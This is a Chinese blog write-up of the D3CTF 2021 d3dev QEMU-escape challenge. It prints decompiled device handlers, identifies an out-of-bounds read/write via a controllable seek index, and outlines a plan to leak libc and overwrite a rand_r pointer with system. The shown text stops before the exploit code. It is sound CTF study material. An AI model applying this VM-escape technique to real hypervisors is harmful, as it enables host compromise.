<!DOCTYPE html>












  


<html class="theme-next pisces use-motion" lang="zh-CN">
<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">












<meta http-equiv="Cache-Control" content="no-transform">
<meta http-equiv="Cache-Control" content="no-siteapp">






















<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">

<link href="/css/main.css?v=6.3.0" rel="stylesheet" type="text/css">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.3.0">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=6.3.0">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=6.3.0">


  <link rel="mask-icon" href="/images/logo.svg?v=6.3.0" color="#222">









<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Pisces',
    version: '6.3.0',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: false,
    fastclick: false,
    lazyload: false,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>


  




  <meta name="description" content="QemuPwn前进四做一下QemuPwn的题，提升一下自己的qemuPwn漏洞利用能力 D3CTFyikesoftware/d3ctf-2021-pwn-d3dev: [D^3CTF 2021] pwn-d3dev 题目附件以及官方writeup (github.com) 程序分析d3dev的具现化函数pci_d3dev_realize中注册了一个mmio，一个pmio 1234567891011">
<meta property="og:type" content="article">
<meta property="og:title" content="QemuPwn前进四">
<meta property="og:url" content="http://yoursite.com/2022/05/04/QemuPwn前进四/index.html">
<meta property="og:site_name" content="zzrR0">
<meta property="og:description" content="QemuPwn前进四做一下QemuPwn的题，提升一下自己的qemuPwn漏洞利用能力 D3CTFyikesoftware/d3ctf-2021-pwn-d3dev: [D^3CTF 2021] pwn-d3dev 题目附件以及官方writeup (github.com) 程序分析d3dev的具现化函数pci_d3dev_realize中注册了一个mmio，一个pmio 1234567891011">
<meta property="og:locale" content="zh-CN">
<meta property="og:image" content="http://yoursite.com/2022/05/04/QemuPwn前进四/image-20220430153732969.png">
<meta property="og:image" content="http://yoursite.com/2022/05/04/QemuPwn前进四/image-20220430154433575.png">
<meta property="og:image" content="http://yoursite.com/2022/05/04/QemuPwn前进四/image-20220430154506414.png">
<meta property="og:image" content="http://yoursite.com/2022/05/04/QemuPwn前进四/image-20220430165858260.png">
<meta property="og:image" content="http://yoursite.com/2022/05/04/QemuPwn前进四/image-20220430170011061.png">
<meta property="og:image" content="http://yoursite.com/2022/05/04/QemuPwn前进四/image-20220430173539886.png">
<meta property="og:image" content="http://yoursite.com/2022/05/04/QemuPwn前进四/image-20220503220736450.png">
<meta property="og:image" content="http://yoursite.com/2022/05/04/QemuPwn前进四/image-20220501182647809.png">
<meta property="og:updated_time" content="2022-05-04T02:07:46.877Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="QemuPwn前进四">
<meta name="twitter:description" content="QemuPwn前进四做一下QemuPwn的题，提升一下自己的qemuPwn漏洞利用能力 D3CTFyikesoftware/d3ctf-2021-pwn-d3dev: [D^3CTF 2021] pwn-d3dev 题目附件以及官方writeup (github.com) 程序分析d3dev的具现化函数pci_d3dev_realize中注册了一个mmio，一个pmio 1234567891011">
<meta name="twitter:image" content="http://yoursite.com/2022/05/04/QemuPwn前进四/image-20220430153732969.png">






  <link rel="canonical" href="http://yoursite.com/2022/05/04/QemuPwn前进四/">



<script type="text/javascript" id="page.configurations">
  CONFIG.page = {
    sidebar: "",
  };
</script>

  <title>QemuPwn前进四 | zzrR0</title>
  









  <noscript>
  <style type="text/css">
    .use-motion .motion-element,
    .use-motion .brand,
    .use-motion .menu-item,
    .sidebar-inner,
    .use-motion .post-block,
    .use-motion .pagination,
    .use-motion .comments,
    .use-motion .post-header,
    .use-motion .post-body,
    .use-motion .collection-title { opacity: initial; }

    .use-motion .logo,
    .use-motion .site-title,
    .use-motion .site-subtitle {
      opacity: initial;
      top: initial;
    }

    .use-motion {
      .logo-line-before i { left: initial; }
      .logo-line-after i { right: initial; }
    }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">zzrR0</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
    
  </div>

  <div class="site-nav-toggle">
    <button aria-label="切换导航栏">
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>



<nav class="site-nav">
  
    <ul id="menu" class="menu">
      
        
        
        
          
          <li class="menu-item menu-item-home">
    <a href="/" rel="section">
      <i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
  </li>
        
        
        
          
          <li class="menu-item menu-item-about">
    <a href="/about/" rel="section">
      <i class="menu-item-icon fa fa-fw fa-user"></i> <br>关于</a>
  </li>
        
        
        
          
          <li class="menu-item menu-item-tags">
    <a href="/tags/" rel="section">
      <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签</a>
  </li>
        
        
        
          
          <li class="menu-item menu-item-categories">
    <a href="/categories/" rel="section">
      <i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类</a>
  </li>
        
        
        
          
          <li class="menu-item menu-item-archives">
    <a href="/archives/" rel="section">
      <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>
  </li>

      
      
    </ul>
  

  

  
</nav>



  



</div>
    </header>

    


    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          
            

          
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2022/05/04/QemuPwn前进四/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="zzrR0">
      <meta itemprop="description" content="Why am i so cai.">
      <meta itemprop="image" content="/images/head.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="zzrR0">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">QemuPwn前进四
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              

              
                
              

              <time title="创建时间：2022-05-04 10:06:38 / 修改时间：10:07:46" itemprop="dateCreated datePublished" datetime="2022-05-04T10:06:38+08:00">2022-05-04</time>
            

            
              

              
            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/Qemu/" itemprop="url" rel="index"><span itemprop="name">Qemu</span></a></span>

                
                
              
            </span>
          

          
            
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-comment-o"></i>
                </span>
                <a href="/2022/05/04/QemuPwn前进四/#comments" itemprop="discussionUrl">
                
                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2022/05/04/QemuPwn前进四/" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          
          
             <span id="/2022/05/04/QemuPwn前进四/" class="leancloud_visitors" data-flag-title="QemuPwn前进四">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">阅读次数：</span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
          

          
            <span class="post-meta-divider">|</span>
            <span class="post-meta-item-icon">
            <i class="fa fa-eye"></i>
             阅读次数： 
            <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
            </span>
          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <h1 id="QemuPwn前进四"><a href="#QemuPwn前进四" class="headerlink" title="QemuPwn前进四"></a>QemuPwn前进四</h1><p>做一下QemuPwn的题，提升一下自己的qemuPwn漏洞利用能力</p>
<h2 id="D3CTF"><a href="#D3CTF" class="headerlink" title="D3CTF"></a>D3CTF</h2><p><a href="https://github.com/yikesoftware/d3ctf-2021-pwn-d3dev" target="_blank" rel="noopener">yikesoftware/d3ctf-2021-pwn-d3dev: [D^3CTF 2021] pwn-d3dev 题目附件以及官方writeup (github.com)</a></p>
<h3 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h3><p>d3dev的具现化函数pci_d3dev_realize中注册了一个mmio，一个pmio</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __<span class="function">fastcall <span class="title">pci_d3dev_realize</span><span class="params">(PCIDevice_0 *pdev, Error_0 **errp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  memory_region_init_io(</span><br><span class="line">    (MemoryRegion_0 *)&amp;pdev[<span class="number">1</span>],</span><br><span class="line">    &amp;pdev-&gt;qdev.parent_obj,</span><br><span class="line">    &amp;d3dev_mmio_ops,</span><br><span class="line">    pdev,</span><br><span class="line">    <span class="string">"d3dev-mmio"</span>,</span><br><span class="line">    <span class="number">0x800</span>uLL);</span><br><span class="line">  pci_register_bar(pdev, <span class="number">0</span>, <span class="number">0</span>, (MemoryRegion_0 *)&amp;pdev[<span class="number">1</span>]);</span><br><span class="line">  memory_region_init_io(</span><br><span class="line">    (MemoryRegion_0 *)&amp;pdev[<span class="number">1</span>].name[<span class="number">56</span>],</span><br><span class="line">    &amp;pdev-&gt;qdev.parent_obj,</span><br><span class="line">    &amp;d3dev_pmio_ops,</span><br><span class="line">    pdev,</span><br><span class="line">    <span class="string">"d3dev-pmio"</span>,</span><br><span class="line">    <span class="number">0x20</span>uLL);</span><br><span class="line">  pci_register_bar(pdev, <span class="number">1</span>, <span class="number">1u</span>, (MemoryRegion_0 *)&amp;pdev[<span class="number">1</span>].name[<span class="number">56</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>d3dev的实例化函数d3dev_instance_init,参数传进来的应该是Object，但是会类型转换成d3devState,</p>
<p>这里初始化了rand_r和4个key</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __<span class="function">fastcall <span class="title">d3dev_instance_init</span><span class="params">(d3devState *obj)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  d3devState *v1; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v2; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  v1 = (d3devState *)object_dynamic_cast_assert(</span><br><span class="line">                       &amp;obj-&gt;pdev.qdev.parent_obj,</span><br><span class="line">                       <span class="string">"d3dev"</span>,</span><br><span class="line">                       <span class="string">"/home/eqqie/CTF/qemu-escape/qemu-source/qemu-3.1.0/hw/misc/d3dev.c"</span>,</span><br><span class="line">                       <span class="number">213</span>,</span><br><span class="line">                       <span class="string">"d3dev_instance_init"</span>);</span><br><span class="line">  v1-&gt;rand_r = (<span class="keyword">int</span> (*)(<span class="keyword">unsigned</span> <span class="keyword">int</span> *))&amp;rand_r;</span><br><span class="line">  <span class="keyword">if</span> ( !v1-&gt;init_flag )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = time(<span class="number">0L</span>L);</span><br><span class="line">    srand(v2);</span><br><span class="line">    v1-&gt;key[<span class="number">0</span>] = rand();</span><br><span class="line">    v1-&gt;key[<span class="number">1</span>] = rand();</span><br><span class="line">    v1-&gt;key[<span class="number">2</span>] = rand();</span><br><span class="line">    v3 = rand();</span><br><span class="line">    v1-&gt;init_flag = <span class="number">1</span>;</span><br><span class="line">    v1-&gt;key[<span class="number">3</span>] = v3;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在localtypes中可以看到d3devState的定义</p>
<p><img src="/2022/05/04/QemuPwn前进四/image-20220430153732969.png" alt="image-20220430153732969"></p>
<p>不过一般其他题，这里可能只能在local_type中找到类型，但是看不到具体结构，有的甚至类型也找不到，只能依靠逆向，这里很仁慈了（后来发现这下面几题都有符号。。）</p>
<p><strong>pmio_read</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">uint64_t</span> __<span class="function">fastcall <span class="title">d3dev_pmio_read</span><span class="params">(d3devState *d3devState, hwaddr addr, <span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">uint64_t</span> result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( addr &gt; <span class="number">0x18</span> )</span><br><span class="line">    result = <span class="number">-1L</span>L;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    result = ((__int64 (__fastcall *)(d3devState *))((<span class="keyword">char</span> *)dword_7ADF30 + dword_7ADF30[addr]))(d3devState);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里else处其实是个switch_case_</p>
<p><img src="/2022/05/04/QemuPwn前进四/image-20220430154433575.png" alt="image-20220430154433575"></p>
<p>分别是读取d3devState中几个成员的值</p>
<p><img src="/2022/05/04/QemuPwn前进四/image-20220430154506414.png" alt="image-20220430154506414"></p>
<p>+AC0 memory_mode</p>
<p>+AC4 seek</p>
<p>+12E0 ~ +12EC key0~key3</p>
<p><strong>pmio_write</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __<span class="function">fastcall <span class="title">d3dev_pmio_write</span><span class="params">(d3devState *opaque, hwaddr addr, <span class="keyword">uint64_t</span> val, <span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">uint32_t</span> *v4; <span class="comment">// rbp</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( addr == <span class="number">8</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( val &lt;= <span class="number">0x100</span> )</span><br><span class="line">      opaque-&gt;seek = val;                       <span class="comment">// 设置seek</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( addr &gt; <span class="number">8</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( addr == <span class="number">28</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      opaque-&gt;r_seed = val;                     <span class="comment">// 设置r_seed</span></span><br><span class="line">      v4 = opaque-&gt;key;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">        *v4++ = ((__int64 (__fastcall *)(<span class="keyword">uint32_t</span> *, __int64, <span class="keyword">uint64_t</span>, _QWORD))opaque-&gt;rand_r)(</span><br><span class="line">                  &amp;opaque-&gt;r_seed,</span><br><span class="line">                  <span class="number">28L</span>L,                         <span class="comment">// 重新产生4个key</span></span><br><span class="line">                  val,</span><br><span class="line">                  *(_QWORD *)&amp;size);</span><br><span class="line">      <span class="keyword">while</span> ( v4 != (<span class="keyword">uint32_t</span> *)&amp;opaque-&gt;rand_r );</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( addr )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( addr == <span class="number">4</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      *(_QWORD *)opaque-&gt;key = <span class="number">0L</span>L;             <span class="comment">// 清零key</span></span><br><span class="line">      *(_QWORD *)&amp;opaque-&gt;key[<span class="number">2</span>] = <span class="number">0L</span>L;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    opaque-&gt;memory_mode = val;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>中间addr == 28的功能，IDA分析的很差，实际看汇编很好懂，就是设置r_seed=val，然后调用rand_r重新产生4个key值</p>
<p><strong>mmio_read</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">uint64_t</span> __<span class="function">fastcall <span class="title">d3dev_mmio_read</span><span class="params">(d3devState *opaque, hwaddr addr, <span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">uint64_t</span> v3; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> sum; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v5; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">uint64_t</span> result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  v3 = opaque-&gt;blocks[opaque-&gt;seek + (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(addr &gt;&gt; <span class="number">3</span>)];</span><br><span class="line">  sum = <span class="number">0xC6EF3720</span>;                             <span class="comment">// tea的常量</span></span><br><span class="line">  v5 = v3;                                      <span class="comment">// v5 = LoDWORD(v3)</span></span><br><span class="line">  result = HIDWORD(v3);</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    LODWORD(result) = result - ((v5 + sum) ^ (opaque-&gt;key[<span class="number">3</span>] + (v5 &gt;&gt; <span class="number">5</span>)) ^ (opaque-&gt;key[<span class="number">2</span>] + <span class="number">16</span> * v5));</span><br><span class="line">    v5 -= (result + sum) ^ (opaque-&gt;key[<span class="number">1</span>] + ((<span class="keyword">unsigned</span> <span class="keyword">int</span>)result &gt;&gt; <span class="number">5</span>)) ^ (opaque-&gt;key[<span class="number">0</span>] + <span class="number">16</span> * result);</span><br><span class="line">    sum += <span class="number">0x61C88647</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( sum );                                <span class="comment">// tea加密</span></span><br><span class="line">  <span class="keyword">if</span> ( opaque-&gt;mmio_read_part )</span><br><span class="line">  &#123;</span><br><span class="line">    opaque-&gt;mmio_read_part = <span class="number">0</span>;</span><br><span class="line">    result = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)result;              <span class="comment">// 高位不加密</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    opaque-&gt;mmio_read_part = <span class="number">1</span>;</span><br><span class="line">    result = v5;                                <span class="comment">// 低位加密</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>mmio_read是以seek作为基址，addr&gt;&gt;3作为偏移，整体作为index，从blocks中取值，这里会一次计算64bit的数据，但是会根据read_part分两次读取</p>
<p><strong>mmio_write</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __<span class="function">fastcall <span class="title">d3dev_mmio_write</span><span class="params">(d3devState *opaque, hwaddr addr, <span class="keyword">uint64_t</span> val, <span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v4; <span class="comment">// rsi</span></span><br><span class="line">  d3devState *v5; <span class="comment">// r11</span></span><br><span class="line">  <span class="keyword">uint64_t</span> v6; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">uint32_t</span> v8; <span class="comment">// er10</span></span><br><span class="line">  <span class="keyword">uint32_t</span> v9; <span class="comment">// er9</span></span><br><span class="line">  <span class="keyword">uint32_t</span> v10; <span class="comment">// er8</span></span><br><span class="line">  <span class="keyword">uint32_t</span> v11; <span class="comment">// edi</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> value0; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">uint64_t</span> value1; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( size == <span class="number">4</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = opaque-&gt;seek + (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(addr &gt;&gt; <span class="number">3</span>);</span><br><span class="line">    <span class="keyword">if</span> ( opaque-&gt;mmio_write_part )</span><br><span class="line">    &#123;</span><br><span class="line">      v5 = (d3devState *)((<span class="keyword">char</span> *)opaque + <span class="number">8</span> * v4);</span><br><span class="line">      v6 = val &lt;&lt; <span class="number">32</span>;</span><br><span class="line">      v7 = <span class="number">0</span>;</span><br><span class="line">      opaque-&gt;mmio_write_part = <span class="number">0</span>;</span><br><span class="line">      v8 = opaque-&gt;key[<span class="number">0</span>];</span><br><span class="line">      v9 = opaque-&gt;key[<span class="number">1</span>];</span><br><span class="line">      v10 = opaque-&gt;key[<span class="number">2</span>];</span><br><span class="line">      v11 = opaque-&gt;key[<span class="number">3</span>];</span><br><span class="line">      value0 = v6 + LODWORD(v5-&gt;blocks[offsetof(d3devState, pdev)]);</span><br><span class="line">      value1 = (v6 + v5-&gt;blocks[offsetof(d3devState, pdev)]) &gt;&gt; <span class="number">32</span>;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        v7 -= <span class="number">0x61C88647</span>;</span><br><span class="line">        value0 += (v7 + value1) ^ (v9 + ((<span class="keyword">unsigned</span> <span class="keyword">int</span>)value1 &gt;&gt; <span class="number">5</span>)) ^ (v8 + <span class="number">16</span> * value1);</span><br><span class="line">        LODWORD(value1) = ((v7 + value0) ^ (v11 + (value0 &gt;&gt; <span class="number">5</span>)) ^ (v10 + <span class="number">16</span> * value0)) + value1;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> ( v7 != <span class="number">0xC6EF3720</span> );               <span class="comment">// tea加密</span></span><br><span class="line">      v5-&gt;blocks[offsetof(d3devState, pdev)] = __PAIR64__(value1, value0);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      opaque-&gt;mmio_write_part = <span class="number">1</span>;</span><br><span class="line">      opaque-&gt;blocks[v4] = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)val;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>这个跟read类似，只不过这里逻辑看着稍微奇怪一点，一开始write_part为0，就先写入低32位，然后置write_part为1，第二写入的时候会先取出刚才写入的值，然后和这次写入的值一起作为tea的两个参数值进行加密，加密完的值最终才会写入到blocks里面，所以要写两次</p>
<p>因为seek是我们指定的，所以这里就存在一个越界读写漏洞，seed也可以由我们指定，因此tea加密也受我们控制</p>
<h3 id="利用流程"><a href="#利用流程" class="headerlink" title="利用流程"></a>利用流程</h3><ol>
<li>用pmio_write设置seek</li>
<li>通过pmio_read读取4个key值，这样我们就可以自己加解密了</li>
<li>通过mmio_read读取r_rand的值，当然读出来是tea处理过的，我们逆回去就可以得到r_rand地址，进而得到libc地址</li>
<li>通过偏移得到system，利用mmio_write覆盖r_rand,</li>
<li>最后用过pmio_write触发r_rand执行system</li>
</ol>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><p>因为是第一题，所以exp编写这里写的详细一点，exp模板可以直接用Strng的</p>
<p><a href="https://github.com/ray-cp/vm-escape/blob/master/qemu-escape/BlizzardCTF2017-Strng/exp.c" target="_blank" rel="noopener">vm-escape/exp.c at master · ray-cp/vm-escape (github.com)</a></p>
<p>首先因为要进行pmio和mmio操作，先通过lspci查看设备</p>
<p><img src="/2022/05/04/QemuPwn前进四/image-20220430165858260.png" alt="image-20220430165858260"></p>
<p>这里没有详细信息，那只能从d3dev类初始化函数里面寻找信息</p>
<p><img src="/2022/05/04/QemuPwn前进四/image-20220430170011061.png" alt="image-20220430170011061"></p>
<p>这里可以看到0x11E8 2333,接下来可以cat其resource来确认一下</p>
